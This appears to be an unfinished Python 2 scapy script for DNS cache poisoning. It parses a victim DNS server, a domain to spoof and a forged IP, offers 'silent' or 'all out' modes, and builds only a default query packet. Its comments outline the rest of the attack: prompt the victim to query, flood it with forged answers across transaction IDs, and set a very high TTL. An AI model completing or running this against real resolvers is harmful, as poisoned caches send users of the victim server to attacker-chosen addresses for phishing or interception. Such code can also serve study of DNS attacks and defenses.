from scapy.all import *
import sys

#input sanitization
args = sys.argv[1:]
#check for victim DNS address
try:
    victim = args[0]
except IndexError:
    print 'No victim DNS address in input.\nTerminating...'
    sys.exit()
#check for the domain that is going to be spoofed
try:
    targetDomain = args[1]
except IndexError:
    print 'No target domain to poison the cache of the victim in input.\nTerminating...'
    sys.exit()
#check for the IP that is to be suppliead as the resolution of the target domain
try:
    adressToForge = args[2]
except IndexError:
    print 'No IP to forge supplied in input.\nTerminating...'
    sys.exit()
# try checking for args[2], if it exists assign appropriate value to silent
# otherwise set silent to false (default)
try:
    choices = {
        'l': 0,
        's': 1
    }
    silent = choices.get(args[3], 0)
    if silent:
        print 'Silent method selected'
    else:
        print "All out method selected"
except IndexError:
    silent = 0
    print 'No loudness method supplied. Resolving to default, all out'

# check whether the supplied DNS server is authoritative and whether it supports reccursion
# if not print and terminate

# send the query with the taret domain to the victim

# after this the victim will start asking other DNS servers for the IP
# flood the victim with the forged query answers including the addressToForge
# try as many TXID combinations and set TTL to a very high value

# default DNS query packet
pkt = IP(dst=victim) / UDP(dport=53) / DNS() # default port for DNS UDP queries
